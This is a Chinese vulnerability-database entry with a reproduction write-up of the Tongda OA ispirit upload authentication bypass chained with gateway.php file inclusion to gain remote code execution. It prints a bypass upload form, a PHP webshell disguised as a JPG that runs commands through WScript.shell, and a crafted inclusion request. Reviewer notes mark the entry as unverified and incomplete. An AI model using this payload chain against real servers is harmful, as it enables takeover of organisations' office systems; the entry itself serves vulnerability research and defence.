---
source: "MrWQ/vulnerability-paper"
title: "通达OA ispirit upload绕过+gateway包含链"
product: "通达OA"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V11及2013–2017；Windows COM"
prerequisites: "P参数绕过，包含示例有Cookie"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.cnblogs.com/PANDA-Mosen/p/13365342.html"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BE%20OA%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%20%2B%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20RCE%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%20%28%E9%99%84%E8%87%AA%E5%86%99%20EXP%29.md"
category_recommendation: "OA / 通达"
id: "vw-de38589e8616aa3f127c30e0"
entity_id: "ve-de38589e8616aa3f127c30e0"
schema_version: "1"
---

# 通达OA ispirit upload绕过+gateway包含链

## 条目说明

- 对象与具体问题：通达OA；ispirit upload绕过+gateway包含链
- 版本、配置及部署条件：V11及2013–2017；Windows COM
- 认证与权限前提：P参数绕过，包含示例有Cookie
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- version误取脚本使用方法
- HTML缺DEST_UID/ATTACHMENT name；多处预期截图内容空白
- 标题附EXP但全文无EXP，仅联系方式
- 系统权限取决于服务账户；版本范围与235矛盾

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/PANDA-Mosen/p/13365342.html) **一、环境搭建：**

下载通达 OA 的安装包，根据提示点击下一步安装即可，安装完成，访问本机 ip 即可



 

**二、漏洞简介：**

可以绕过身份认证,，然后即可上传任意文件，配合文件包含即可造成 RCE 远程代码执行漏洞

 

**影响版本：**

V11 版、2017 版、2016 版、2015 版、2013 增强版、2013 版

 

 

**三、漏洞复现：**

**1、任意文件上传漏洞位置：**

```
/ispirit/im/upload.php
```



**2、构造 payload 上传文件：**

①将以下内容保存为 html：

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
<html>
<body>
<form action="http://127.0.0.1/ispirit/im/upload.php" method="post"  enctype="multipart/form-data">
<input  type="text"name='P' value = 1  ></input>    //用来绕过身份验证
<input  type="text"name='MSG_CATE' value = 'file'></input>
<input  type="text"name='UPLOAD_MODE' value = 1 ></input>
<input type="text"  value = 1></input>
<input type="file" ></input>
<input type="submit" ></input>
</body>
</html>
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 

**②将以下内容保存为 shell.jpg:**

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```
<?php
$command=$_POST['cmd'];
$wsh = new COM('WScript.shell');
$exec = $wsh->exec("cmd /c ".$command);
$stdout = $exec->StdOut();
$stroutput = $stdout->ReadAll();
echo $stroutput;
?>
```

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

 

**③利用 html 文件上传 shell.jpg：**



 

**返回上传 shell.jpg 后的文件名信息：**



**3、利用文件包含漏洞进行 RCE：**

**文件包含漏洞位置：**

```
/ispirit/interface/gateway.php
```

 

**访问漏洞页面，并且把 GET 改成 POST，并修改、构造数据包，注意 Content-Type 是要手动加上的：**

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")

```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=8phdj361a5d498n03tnqd7c104; KEY_RANDOMDATA=17743;PHPSESSID=8phdj361a5d498n03tnqd7c104;
Connection: close
Content-Type: application/x-www-form-urlencoded
 
json={"url":"/general/../../attach/im/2006/209898972.shell.jpg"}&cmd=whoami
```

> 请求长度说明：原资料 Content-Length 为 77；静态长度已移除，应由客户端根据最终请求体的字节数生成。

[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")



json 中的值，根据返回的文件名进行构造，例如： 2006_209898972|shell.jpg，那么就是上面这样构造

 

然后就可以进行 RCE 了，以系统权限执行任何命令

 

 

**4、利用脚本进行攻击（自己写的，支持的功能：①直接执行命令、②文件包含生成 webshell）：**

注意：脚本中的 gateway.php 文件的路径根据 OA 版本进行修改，例如：

```
2013版本：/ispirit/interface/gateway.php
2017版本：/mac/gateway.php
```

  **脚本使用方法:**

```
python3 TDoa_RCE 目标url -f 选择的功能
```

![](https://img2020.cnblogs.com/blog/2063846/202007/2063846-20200723113259363-1757148902.png)

生成 webshell

 ![](https://img2020.cnblogs.com/blog/2063846/202007/2063846-20200723113337751-1493871276.png)

脚本就不直接放在这了... 需要的可以联系我 (QQ 或者 wx 公众号后台留言)，注意：仅作为学习和讨论使用，禁止任何违法行为，与作者无关！

QQ：1254311935

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
